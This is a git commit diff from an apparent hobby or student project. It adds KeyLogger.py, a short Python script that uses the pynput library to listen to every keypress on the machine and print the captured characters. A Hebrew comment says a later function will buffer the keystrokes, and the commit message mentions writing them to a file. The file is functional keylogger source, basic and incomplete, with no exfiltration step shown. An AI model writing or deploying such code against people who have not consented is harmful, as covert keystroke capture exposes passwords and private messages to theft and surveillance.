4af7b56df1b9a6eb2e02f5eff2d76129fa0f152d
Yaakov <y0583275590@gmail.com>
2025-02-12 11:17:15 +0200

    add write_to_file by yaakov

---
+++ KeyLogger.py
@@ -0,0 +1,19 @@
+from pynput.keyboard import Listener
+
+def key_listening():
+    with Listener(on_press=letter_import) as listening:
+        listening.join()
+
+def letter_import(letter):
+    letter = str(letter)
+    letter = letter.replace("'", "")
+    if letter in ['Key.space', 'Key.enter']:
+        letter = ' '
+    if letter in ["Key.caps_lock" , "Key.shift_r" , "Key.backspace" , "Key.ctrl_l" , "Key.shift"]:
+        letter = ""
+    print(letter)
+    #פה צריך להיות קריאה לפונקציה שנכתוב (המנג'ר) שלוקח את האות שהתקבלה ושומר אותה בבפר
+    return letter
+
+
+key_listening()
